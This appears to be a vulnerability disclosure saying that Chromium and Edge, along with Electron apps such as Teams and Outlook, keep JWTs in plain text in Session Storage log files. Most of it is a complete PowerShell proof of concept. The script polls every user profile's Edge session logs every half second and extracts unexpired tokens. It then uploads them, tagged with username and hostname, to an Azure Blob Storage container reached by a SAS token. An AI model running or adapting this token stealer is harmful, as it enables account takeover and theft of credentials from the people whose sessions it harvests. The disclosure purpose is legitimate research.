VULNERABILITY DETAILS
Chromium browser is storing secrets in plain text on ephemeral LevelDB log files. An attacker can read these files and extract secrets such as JSON Web Tokens (JWT) if the web site code has stored secrets as Local or Session Storage. If secrets are written to Local or Session storage, these secrets can then be used to impersonate a victim, spoof the victim or gain privilege escalation over a service that the victim is subscribed to. This information is ephemeral, it is related to a web browser session. The session storage, in different browser configurations, might get purged once the browser is closed.

JWT tokens and refresh tokens for Electron applications and Edge browser that are passed as authentication header end up stored at Local or Session Storage as directed by the website or Electron application. Chromium browsers store Session Storage at “%USERPATH%\AppData\User Data\Default\Session Storage” this happens to also be for electron apps such as Teams and Outlook. As a result, teams and outlook have a JWT stored in plain text on a file on disk. The file name consists of 6 numbers with the extension log.

function Parse-JWTtoken {
 
    [cmdletbinding()]
    param([Parameter(Mandatory=$true)][string]$token)
 
    #Validate as per https://tools.ietf.org/html/rfc7519
    #Access and ID tokens are fine, Refresh tokens will not work
    if (!$token.Contains(".") -or !$token.StartsWith("eyJ")) { Write-Error "Invalid token" -ErrorAction Stop }
 
    #Header
    $tokenheader = $token.Split(".")[0].Replace('-', '+').Replace('_', '/')
    #Fix padding as needed, keep adding "=" until string length modulus 4 reaches 0
    while ($tokenheader.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenheader += "=" }
    #Payload
    $tokenPayload = $token.Split(".")[1].Replace('-', '+').Replace('_', '/')
    #Fix padding as needed, keep adding "=" until string length modulus 4 reaches 0
    while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
    #Convert to Byte array
    $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
    #Convert to string array
    $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
    #Convert from JSON to PSObject
    $tokobj = $tokenArray | ConvertFrom-Json
    return $tokobj
}

function Calculate-Expiry($exp){
    $expiry = "Expired"
    $currentTimeStamp = [int](Get-Date (Get-Date).ToUniversalTime() -UFormat %s -Millisecond 0)
    if ($exp -gt $currentTimeStamp) {
        $expiry = "$([math]::Floor(($exp - $currentTimeStamp) / 60)) min"
    }
    return $expiry
}

# Function to upload a file to Azure Blob Storage
function Upload-FileToAzureBlob {
    param (
        [string]$FilePath,  # Path to the file to be uploaded
        [string]$newFilename  # New filename for the uploaded file
    )
    
    $StorageAccountName = "<Storage Account Name>"
    $ContainerName = "<Storage Container Name>"
    $SasToken = "<SAS Token>"

    # Construct the full URL for the Azure Blob Storage with the SAS token
    $BlobUrl = "https://$StorageAccountName.blob.core.windows.net/$ContainerName/" + $newFilename + "?$SasToken"

    # Function to find JWTs
    function Find-JWTs {
        param (
            [string]$InputString  # Input string to search for JWTs
        )

        # Remove all whitespace in the input string
        $InputString = $InputString -replace '\s+', ''

        # Define the regex pattern for JWT
        $pattern = 'eyJ[^"]*'

        # Initialize an array to store JWTs 
        $Jwts = @()

        # Find all matches
        $matches = [regex]::Matches($InputString, $pattern)

        foreach ($match in $matches) {
            if ($match.Value.Contains("eyJ")) {
                try {
                    $jwtDetails = Parse-JWTtoken $match.Value
                    if($jwtDetails.exp -eq $null){
                            continue
                    }
                    if((Calculate-Expiry $jwtDetails.exp) -eq "Expired"){
                        Write-Host "        [-] Found expired token, skipping"
                        continue
                    }
                } catch {}

                # Add to array
                $Jwts += $match.Value
            }
        }

        # Return the array or null if empty
        if ($Jwts.Count -eq 0) {
            return $null
        } else {
            return $Jwts
        }
    }

    # Read the file content, avoiding any file locks
    $command = "cmd /c copy `"$filePath`" `"$filePath-2`" " 
    Invoke-Expression $command
    $fileContent = $(Get-Content "$filePath-2" -raw) -replace("`0","")
    rm "$filePath-2"

    $foundJWTs = Find-JWTs -InputString $fileContent

    if ($foundJWTs -eq $null) {
        return
    }

    if ($foundJWTs -ne $null) {
        # Upload the JWT to Azure Blob Storage
        $response = Invoke-RestMethod -Uri $BlobUrl -Method Put -Body $foundJWTs -Headers @{
            "x-ms-blob-type" = "BlockBlob"  # Specify the blob type
            "x-ms-content-length" = $($foundJWTs.Length)  # Use content length
            "Content-Type" = "application/octet-stream"  
        }

        Write-Output "File uploaded successfully to $BlobUrl"
    } else {
        Write-Output "Failed to read the file."
    }
}

# Get all user profiles
$userProfiles = Get-WmiObject Win32_UserProfile | Where-Object { $_.Special -eq $false }
while ($true) {
    foreach ($profile in $userProfiles) {
        if (Test-Path $profile.LocalPath) {
            $username = $profile.LocalPath.Split('\')[-1]  # Get just the username

            # Get the desired file
            $FileDir = "C:\Users\$username\AppData\Local\Microsoft\Edge\User Data\Default\Session Storage\"
            $DesiredFile = Get-ChildItem -Path $FileDir -Filter *.log
            $FilePath = $DesiredFile.FullName
            $LastModified = $DesiredFile.LastWriteTime
            $notRead = $true
            try {$notRead = $(-not $lastreadtime -or $LastModified -gt $lastreadtime)}
            catch {}
            if ($notRead) {
                # Construct the full URL for the Azure Blob Storage with the SAS token
                $date = $(get-date).ToUniversalTime().ToString("yyyy_MM_ddTHH_mm_ss")
                $hostname = hostname
                $fname = Split-Path -Leaf $FilePath
                $newFilename = $username + "_" + $hostname + "_" + $date + "_" + $fname

                Upload-FileToAzureBlob -FilePath $FilePath -newFilename $newFilename

                $lastreadtime = $LastModified
            }  
        }
    }
    Start-Sleep -Milliseconds 500
}
